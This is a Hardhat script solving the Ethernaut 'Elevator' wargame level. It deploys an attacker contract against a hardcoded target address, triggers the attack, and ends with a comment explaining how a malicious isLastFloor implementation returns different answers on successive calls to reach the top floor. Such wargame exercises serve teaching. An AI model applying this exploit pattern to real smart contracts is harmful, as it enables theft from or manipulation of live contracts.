import { ethers } from "hardhat";
import { deployContract } from "../../utils/deployContract";
import { abi } from "../../artifacts/contracts/11.Elevator/Elevator.sol/Elevator.json";
import { Contract } from "ethers";

import { displayResult } from "../../utils/displayResult";

const targetAddress = "0xFFD17b470244615B336c74Be935E1557F2900DdF";

async function main() {
  const [attacker] = await ethers.getSigners();
  const target = new Contract(targetAddress, abi, attacker);

  const ContactFactory = await ethers.getContractFactory("ElevatorAttacker");
  const elevatorAttacker = await deployContract("ElevatorAttacker", attacker, [
    targetAddress,
  ]);

  await ContactFactory.deploy(target.address);
  await elevatorAttacker.deployed();

  const tx = await elevatorAttacker.attack({ gasLimit: "3000000" });
  await tx.wait();
  displayResult(await target.top());
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});

/* Explanation of the attack

The Elevator contrat expects to interact with a contract respecting the Building interface.
So we have the hand on the implemenation. The elevator contract trust our isLastFloor function.
We can use this to return false to pass the if statement and then return true on next call.

*/
